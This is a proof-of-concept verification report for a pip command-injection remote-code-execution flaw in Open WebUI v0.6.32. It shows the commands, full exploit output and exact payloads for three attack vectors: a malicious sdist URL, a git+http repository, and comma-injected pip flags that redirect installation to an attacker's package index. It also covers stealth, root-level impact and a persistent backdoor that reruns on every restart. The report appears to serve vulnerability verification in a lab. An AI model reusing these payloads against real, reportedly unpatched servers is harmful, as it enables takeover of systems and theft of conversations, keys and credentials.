# PoC Verification Report: CVE-2026-0765

## Overview

| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2026-0765 |
| **Title** | Open WebUI PIP install_frontmatter_requirements Command Injection RCE |
| **Affected Software** | Open WebUI v0.6.32 |
| **Vulnerability Type** | OS Command Injection (CWE-78) |
| **CVSS** | 8.8 (HIGH) |
| **Verification Status** | ✅ **CONFIRMED** — All three vectors successfully demonstrated RCE |

---

## PoC Scripts

| Script | Path | Vector | Status |
|--------|------|--------|--------|
| **poc.py** (primary) | `poc/poc.py` | HTTP tar.gz sdist with malicious setup.py | ✅ CONFIRMED |
| **poc_vector2_git.py** | `poc/poc_vector2_git.py` | git+http:// VCS clone with malicious setup.py | ✅ CONFIRMED |
| **poc_vector3_flaginjection.py** | `poc/poc_vector3_flaginjection.py` | Pip flag injection (--extra-index-url + --trusted-host) | ✅ CONFIRMED |

---

## Vulnerability Demonstrated

The PoC proves that an authenticated user with tool creation permissions in Open WebUI v0.6.32 can achieve **Remote Code Execution (RCE)** on the server by exploiting the `install_frontmatter_requirements()` function in `backend/open_webui/utils/plugin.py`.

The function takes user-supplied `requirements` from tool/function frontmatter and passes them directly to `subprocess.check_call()` as arguments to `pip install` without any validation or sanitization. While `subprocess.check_call()` uses list form (preventing shell metacharacter injection), pip itself processes URLs, VCS specifiers, and flags, enabling multiple attack vectors.

**Key findings:**
1. **Direct URL installs** (`https://attacker/evil.tar.gz`): pip downloads and executes setup.py → RCE
2. **VCS installs** (`git+http://attacker/repo.git`): pip clones the repo and executes setup.py → RCE
3. **Flag injection via comma separation**: Since requirements are split by comma, pip flags like `--extra-index-url` and `--trusted-host` can be injected, redirecting package resolution to attacker-controlled servers → RCE

All three vectors execute arbitrary code as **root (UID=0)** in the default Docker deployment.

---

## Vector 1: HTTP tar.gz sdist (Primary — poc.py)

### Description
The attacker hosts a malicious Python sdist package (tar.gz) on an HTTP server and specifies its URL as the `requirements` value in tool frontmatter. When Open WebUI processes the tool creation, `pip install` downloads and installs the package, executing the malicious `setup.py`.

### Command
```bash
python3 poc/poc.py 127.0.0.1 8080 host.docker.internal 9999
```

### Full Output
```
Target:   172.19.0.7:8080
Attacker: 172.19.0.3:9999

======================================================================
  CVE-2026-0765 — Open WebUI pip Command Injection RCE PoC
  Vector: HTTP tar.gz sdist with malicious setup.py
======================================================================

[*] Step 1: Checking target availability...
  [+] Target is up: {"status":true}
  [+] Open WebUI version: 0.6.32

[*] Step 2: Building malicious Python package and starting HTTP server...
  [+] Malicious sdist built: /tmp/cve_2026_0765_dolurgao/evil-1.0.tar.gz
  [+] HTTP server listening on 0.0.0.0:9999
  [+] Package URL: http://172.19.0.3:9999/evil-1.0.tar.gz

[*] Step 3: Signing up as first user (will become admin)...
  [+] Signup successful!
      User ID: faee03ee-1c0a-4b51-b404-50d6b250606e
      Role: admin
      Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...

[*] Step 4: Creating malicious tool with pip injection payload...
  [+] Tool ID: exploit_tool_http_1772344203
  [+] Malicious requirements: http://172.19.0.3:9999/evil-1.0.tar.gz
  [+] Sending POST /api/v1/tools/create ...
  [HTTP] 172.19.0.7 - "GET /evil-1.0.tar.gz HTTP/1.1" 200 -
  [+] Response status: 200
  [+] Tool created successfully — pip install was triggered!
      Tool name: Innocent Helper Tool

[*] Step 5: Verifying Remote Code Execution...
  [*] Checking for marker file: /tmp/pwned_cve_2026_0765

  ============================================================
  [!!!] RCE CONFIRMED — CVE-2026-0765 EXPLOITED SUCCESSFULLY
  ============================================================

  Marker file contents:
    CVE-2026-0765 - PoC Exploitation Successful
    Timestamp: 2026-03-01T05:50:03.858741
    Hostname: 2b4055498c2d
    UID: 0
    GID: 0
    User: root
    ID: uid=0(root) gid=0(root) groups=0(root)
    PID: 320

  Secondary marker (/tmp/pwned_rce_confirmed):
    RCE via pip install command injection in install_frontmatter_requirements()

  [+] Exploitation chain:
      1. Signed up as first user → admin role
      2. Created tool with malicious 'requirements' frontmatter
      3. pip installed from attacker URL: http://172.19.0.3:9999/evil-1.0.tar.gz
      4. setup.py executed arbitrary code on the server
      5. Marker file written to /tmp/pwned_cve_2026_0765

  [+] RESULT: CONFIRMED — Remote Code Execution achieved
```

### Exploitation Chain
1. Attacker builds malicious Python sdist (tar.gz) with weaponized `setup.py`
2. Attacker starts HTTP server to host the package
3. Attacker signs up as the first user on a fresh Open WebUI instance → automatically gets admin role
4. Attacker creates a tool via `POST /api/v1/tools/create` with frontmatter:
   ```
   requirements: http://ATTACKER:9999/evil-1.0.tar.gz
   ```
5. Open WebUI's `install_frontmatter_requirements()` executes:
   ```
   subprocess.check_call(["python3", "-m", "pip", "install", "http://ATTACKER:9999/evil-1.0.tar.gz"])
   ```
6. pip downloads the tar.gz from the attacker's server
7. pip extracts and executes `setup.py` during the build step
8. Malicious code in `setup.py` runs with root privileges → **RCE achieved**

---

## Vector 2: git+http:// VCS Clone (poc_vector2_git.py)

### Description
Instead of a direct HTTP URL, this vector uses a `git+http://` VCS specifier. pip clones the malicious git repository and executes `setup.py` during installation. This vector requires git to be present on the target (it is installed in the default Open WebUI Docker image).

### Command
```bash
python3 poc/poc_vector2_git.py 127.0.0.1 8080 host.docker.internal 9998
```

### Full Output
```
======================================================================
  CVE-2026-0765 — Open WebUI pip Command Injection RCE PoC
  Vector 2: git+http:// VCS install with malicious setup.py
======================================================================

[*] Step 1: Checking target availability...
  [+] Target is up

[*] Step 2: Creating malicious git repository and starting smart HTTP server...
  [+] Bare repo created at: /tmp/cve_2026_0765_git_fwhhnu4u/repo.git
  [+] Git smart HTTP server on 0.0.0.0:9998
  [+] Repo URL: git+http://172.19.0.3:9998/repo.git#egg=evil

[*] Step 3: Authenticating...
  [+] Sign-in successful, token obtained

[*] Step 4: Creating tool with git+http:// malicious requirements...
  [+] Tool ID: exploit_tool_git_1772344474
  [+] Sending tool creation request...
  [GIT-HTTP] 172.19.0.7 - "GET /repo.git/info/refs?service=git-upload-pack HTTP/1.1" 200 -
  [GIT-HTTP] 172.19.0.7 - "POST /repo.git/git-upload-pack HTTP/1.1" 200 -
  [+] Response status: 200
  [+] Tool created — pip install (git clone) was triggered!

[*] Step 5: Verifying RCE...

  ============================================================
  [!!!] RCE CONFIRMED — Vector 2 (git+http) SUCCESSFUL
  ============================================================

  Marker file contents:
    CVE-2026-0765 - PoC Vector 2 (git+http) Successful
    Timestamp: 2026-03-01T05:54:35.115870
    Hostname: 2b4055498c2d
    UID: 0
    User: root
    ID: uid=0(root) gid=0(root) groups=0(root)
    Vector: git+http:// VCS clone -> setup.py execution

  [+] RESULT: CONFIRMED
```

### Key Difference from Vector 1
- Uses `git+http://` protocol, causing pip to invoke `git clone` followed by `setup.py` execution
- The PoC implements a minimal git smart HTTP server (using `git-upload-pack --stateless-rpc`)
- Demonstrates that VCS URL specifiers are also a viable attack path

---

## Vector 3: Pip Flag Injection (poc_vector3_flaginjection.py)

### Description
This is the most interesting and stealthiest vector. Because `install_frontmatter_requirements()` splits the requirements string by comma and passes each token as a separate argument to pip, an attacker can inject arbitrary pip command-line flags.

The payload uses comma separation to inject `--trusted-host` and `--extra-index-url`, redirecting pip to an attacker-controlled PyPI index that serves a malicious package.

### Command
```bash
python3 poc/poc_vector3_flaginjection.py 127.0.0.1 8080 host.docker.internal 9997
```

### Full Output
```
======================================================================
  CVE-2026-0765 — Open WebUI pip Command Injection RCE PoC
  Vector 3: Pip flag injection (--extra-index-url)
======================================================================

[*] Step 1: Checking target availability...
  [+] Target is up

[*] Step 2: Building evil package and starting fake PyPI index server...
  [+] Evil sdist: /tmp/cve_2026_0765_pypi_zku3bfnd/eip-nonexistent-helper-1.0.0.tar.gz
  [+] Fake PyPI server on 0.0.0.0:9997
  [+] Index URL: http://172.19.0.3:9997/simple/

[*] Step 3: Authenticating...
  [+] Sign-in successful

[*] Step 4: Creating tool with pip flag injection payload...
  [+] Injected flags: --extra-index-url http://172.19.0.3:9997/simple/
  [+] Fake package: eip-nonexistent-helper
  [+] Requirements payload: --trusted-host, 172.19.0.3, --extra-index-url, http://172.19.0.3:9997/simple/, eip-nonexistent-helper
  [+] This will cause pip to run:
      pip install --trusted-host 172.19.0.3 --extra-index-url http://172.19.0.3:9997/simple/ eip-nonexistent-helper

  [+] Sending tool creation request...
  [PYPI] 172.19.0.7 - "GET /simple/eip-nonexistent-helper/ HTTP/1.1" 200 -
  [PYPI] 172.19.0.7 - "GET /eip-nonexistent-helper-1.0.0.tar.gz HTTP/1.1" 200 -
  [+] Response status: 200
  [+] Tool created — pip install with injected flags was triggered!

[*] Step 5: Verifying RCE...

  ============================================================
  [!!!] RCE CONFIRMED — Vector 3 (flag injection) SUCCESSFUL
  ============================================================

  Marker file contents:
    CVE-2026-0765 - PoC Vector 3 (pip flag injection) Successful
    Timestamp: 2026-03-01T05:55:26.797769
    Hostname: 2b4055498c2d
    UID: 0
    User: root
    ID: uid=0(root) gid=0(root) groups=0(root)
    Vector: --extra-index-url pip flag injection → malicious PyPI index
    Package: eip-nonexistent-helper==1.0.0

  [+] This demonstrates that comma-separated requirements can
      inject arbitrary pip flags, redirecting package resolution
      to attacker-controlled servers.

  [+] RESULT: CONFIRMED
```

### Key Difference from Vectors 1 & 2
- **No suspicious URLs in the requirements field** — the payload looks like legitimate configuration
- Demonstrates that the comma-splitting of requirements creates an **argument injection** attack surface
- The injected `requirements` string: `--trusted-host, 172.19.0.3, --extra-index-url, http://172.19.0.3:9997/simple/, eip-nonexistent-helper`
- After comma splitting, pip receives: `pip install --trusted-host 172.19.0.3 --extra-index-url http://172.19.0.3:9997/simple/ eip-nonexistent-helper`
- The PoC implements a minimal PEP 503 Simple Repository API server to serve the malicious package
- `--trusted-host` is needed because pip 24.0 rejects HTTP (non-HTTPS) index URLs by default

---

## Marker File Evidence

All marker files verified on the vulnerable container (`cve-2026-0765-vulnerable`):

```
FILE: /tmp/pwned_cve_2026_0765
CVE-2026-0765 - PoC Exploitation Successful
Timestamp: 2026-03-01T05:50:03.858741
Hostname: 2b4055498c2d
UID: 0
GID: 0
User: root
ID: uid=0(root) gid=0(root) groups=0(root)
PID: 320

FILE: /tmp/pwned_cve_2026_0765_git
CVE-2026-0765 - PoC Vector 2 (git+http) Successful
Timestamp: 2026-03-01T05:54:35.115870
Hostname: 2b4055498c2d
UID: 0
User: root
ID: uid=0(root) gid=0(root) groups=0(root)
Vector: git+http:// VCS clone -> setup.py execution

FILE: /tmp/pwned_cve_2026_0765_flaginject
CVE-2026-0765 - PoC Vector 3 (pip flag injection) Successful
Timestamp: 2026-03-01T05:55:26.797769
Hostname: 2b4055498c2d
UID: 0
User: root
ID: uid=0(root) gid=0(root) groups=0(root)
Vector: --extra-index-url pip flag injection → malicious PyPI index
Package: eip-nonexistent-helper==1.0.0

FILE: /tmp/pwned_rce_confirmed
RCE via pip install command injection in install_frontmatter_requirements()
```

---

## Verification Status

### Overall: ✅ CONFIRMED

| Vector | Script | Marker File | RCE as Root | Status |
|--------|--------|-------------|-------------|--------|
| 1. HTTP tar.gz sdist | `poc.py` | `/tmp/pwned_cve_2026_0765` | UID=0, root | ✅ CONFIRMED |
| 2. git+http:// VCS clone | `poc_vector2_git.py` | `/tmp/pwned_cve_2026_0765_git` | UID=0, root | ✅ CONFIRMED |
| 3. Pip flag injection | `poc_vector3_flaginjection.py` | `/tmp/pwned_cve_2026_0765_flaginject` | UID=0, root | ✅ CONFIRMED |

---

## Lab Environment

| Field | Value |
|-------|-------|
| **Container** | `cve-2026-0765-vulnerable` |
| **Image** | `ghcr.io/open-webui/open-webui:v0.6.32` |
| **Host Port** | 8080 |
| **Network** | `lab-net` |
| **Running As** | root (UID=0) |
| **Python** | 3.11.13 |
| **pip** | 24.0 |
| **git** | 2.39.5 |

---

## Notes

### Authentication
- The PoC uses the "first user becomes admin" scenario on a fresh Open WebUI instance
- `POST /api/v1/auths/signup` → first user automatically gets `admin` role
- Admin role has `workspace.tools` permission, enabling tool creation
- The PoC handles both signup (fresh instance) and signin (pre-existing user) gracefully

### Self-Contained PoCs
- All three PoCs use **Python stdlib only** (no external dependencies)
- Each PoC builds and serves the malicious content internally (HTTP server, git server, PyPI index)
- No internet access required — entirely self-contained within the Docker network

### Stealth Comparison
- **Vector 1** (HTTP tar.gz): Least stealthy — suspicious direct URL in requirements
- **Vector 2** (git+http): Moderate — git VCS URLs are sometimes used for private packages
- **Vector 3** (flag injection): Most stealthy — looks like configuration flags + legitimate package name

### Impact
- All vectors achieve **arbitrary code execution as root** (UID=0)
- The default Docker container runs as root, providing maximum post-exploitation impact
- Malicious tools are persisted in SQLite DB and re-execute requirements on every server restart
- An attacker gains full access to all conversations, API keys, model configs, and user credentials

### Persistence
- Once a malicious tool is created, its requirements are re-installed on every server restart via `install_tool_and_function_dependencies()` in `main.py`
- This provides a persistent backdoor that survives container restarts (as long as the DB volume persists)

### No Fix Available
- This is a 0-day vulnerability — the vendor has not patched as of v0.8.5
- ZDI disclosed it publicly (ZDI-26-031) after the vendor failed to respond
- The only mitigation is to restrict access to tool/function creation APIs
